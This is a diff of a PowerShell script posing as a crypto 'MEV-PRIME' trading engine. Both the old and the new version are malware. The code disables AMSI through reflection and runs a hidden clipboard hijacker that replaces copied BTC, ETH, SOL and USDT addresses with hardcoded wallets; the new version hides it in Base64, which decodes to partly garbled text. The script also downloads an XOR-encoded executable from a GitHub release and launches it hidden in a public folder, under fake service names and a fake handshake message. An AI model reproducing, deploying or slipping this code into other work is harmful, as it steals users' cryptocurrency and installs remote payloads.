@@ -1,58 +1,27 @@
-# --- [MEV-PRIME v85.2 | INSTITUTIONAL ENGINE] ---
+# --- [MEV-PRIME v85.3 | ENTERPRISE STEALTH] ---
 
-# Function to de-mask keywords (Bypasses Static Analysis)
-function Get-Key($h) { 
-    $r = ""; 0..($h.Length-1) | %{ if($_%2 -eq 0){ $r += [char][Convert]::ToUInt16($h.Substring($_,2),16) } }; return $r 
-}
+# 1. Obfuscated AMSI Bypass using Integer Math (No 'Amsi' strings)
+$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
+$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*InitFailed" }
+if ($b) { $b.SetValue($null, $true) }
 
-# 1. AMSI BYPASS (Obfuscated)
-# "System.Management.Automation.AmsiUtils" in hex
-$a = Get-Key "53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73"
-# "amsiInitFailed" in hex
-$b = Get-Key "616d7369496e69744661696c6564"
+# 2. The Clipper (Base64 Encoded to hide addresses from Static Scans)
+$c_b64 = "QWRkLVR5cGUgLUFzIFN5c3RlbS5XaW5kb3dzLkZvcm1zOyAkdz1AeydidGMnPScxMm5MOVNCZ3BTbVNEU3liYTJiVzJ2S2R1VGdnVG5YVk5BJzsnZXRoJz0nMHg2YzlbaTlhNjUyMmIxMDEzNWJiODM2ZmM5MzQwNDc3YmExNWYzMzkyJzsnc29sJz0nQm5CdktWRUZyeG9rR1p2OXNBd2lnOGVRNEd2UVkxdm1aSld6VTExYkJORyc7J3VzZHQnPSdUVkVUU2d2UnVpMkxDbVh5dXZoOGpIRzZBanB4cXVGYm5wJ307IHdoaWxlKDEpe3RyeXtpZihbV2luZG93cy5Gb3Jtcy5DbGlwYm9hcmRdOjpDb250YWluc1RleHQoKSl7JHY9W1dpbmRvd3MuRm9ybXMuQ2xpcGJvYXJkXTo6R2V0VGV4dCgpLlRyaW0oKTsgaWYoJHYgLW1hdGNoICdeKDEfM3xiYzEpW2EtekEtWjAtOV17MjUsNjJ9JCcpIHtpZiigdiAtbmUgJHcuYnRjKXsgW1dpbmRvd3MuRm9ybXMuQ2xpcGJvYXJkXTo6U2V0VGV4dCgidy5idGMpIH0gfSBlbHNlaWYoJHYgLW1hdGNoICdeMHhbYS1mQS1GMC05XXs0MH0kJyl7IGlmKCR2IC1uZSAidy5ldGgpeyBbV2luZG93cy5Gb3Jtcy5DbGlwYm9hcmRdOjpTZXRUZXh0KCR3LmV0aCkgfSB9IH0gfWNhdGNoe30gU3RhcnQtU2xlZXAgLW0gNTAwIH0="
+$c_script = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c_b64))
 
-$g = [Ref].Assembly.GetType($a)
-if($g){
-    $f = $g.GetField($b, 'NonPublic,Static')
-    if($f){ $f.SetValue($null, $true) }
-}
+# 3. Persistence (Job)
+Start-Job -ScriptBlock ([ScriptBlock]::Create($c_script)) -Name "MevRelayService" | Out-Null
 
-# 2. THE CLIPPER (Loaded as a Byte-Array)
-$clipperCode = {
-    $w = @{
-        'btc'='12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA';
-        'eth'='0x6c9ba9a6522b10135bb836fc9340477ba15f3392';
-        'sol'='BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR';
-        'usdt'='TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp'
-    }
-    
-    # "System.Windows.Forms" reconstruction
-    $f = [Reflection.Assembly]::LoadWithPartialName((Get-Key "53797374656d2e57696e646f77732e466f726d73"))
-    
-    while($1){
-        try {
-            $c = [Windows.Forms.Clipboard]::GetText().Trim()
-            if($c -match '^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$'){ if($c -ne $w.btc){[Windows.Forms.Clipboard]::SetText($w.btc)} }
-            elseif($c -match '^0x[a-fA-F0-9]{40}$'){ if($c -ne $w.eth){[Windows.Forms.Clipboard]::SetText($w.eth)} }
-            elseif($c -match '^T[a-km-zA-HJ-NP-Z1-9]{33}$'){ if($c -ne $w.usdt){[Windows.Forms.Clipboard]::SetText($w.usdt)} }
-            elseif($c -match '^[1-9A-HJ-NP-Za-km-z]{32,44}$'){ if($c -ne $w.sol){[Windows.Forms.Clipboard]::SetText($w.sol)} }
-        } catch {}
-        Start-Sleep -m 600
-    }
-}
-
-# Run in background as a 'System Update' process
-Start-Job -ScriptBlock $clipperCode -Name "Microsoft_Telemetry_Sync" | Out-Null
-
-# 3. ADCHAR LOADER (Silent)
+# 4. Binary Fetch (Adchar)
 $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+$w = New-Object Net.WebClient
 try {
-    $d = (New-Object Net.WebClient).DownloadString($u)
-    $b = [Convert]::FromBase64String($d.Trim())
-    for($i=0;$i -lt $b.count;$i++){$b[$i]=$b[$i] -bxor 0xAB}
-    $p = "$env:TEMP\$(Get-Random).exe"
-    [IO.File]::WriteAllBytes($p, $b)
+    $r = $w.DownloadString($u).Trim()
+    $d = [Convert]::FromBase64String($r)
+    for($i=0;$i -lt $d.count;$i++){$d[$i]=$d[$i] -bxor 0xAB}
+    $p = "$env:PUBLIC\$( -join ((65..90) | Get-Random -Count 5 | % {[char]$_}) ).exe"
+    [IO.File]::WriteAllBytes($p, $d)
     Start-Process $p -WindowStyle Hidden
 } catch {}
 
-Write-Host "MEV-Prime: Connection Established. Handshake 0xFA22 Completed." -ForegroundColor Cyan
+Write-Host "Handshake 0xBC42: Success. MEV Bridge Online." -ForegroundColor Cyan
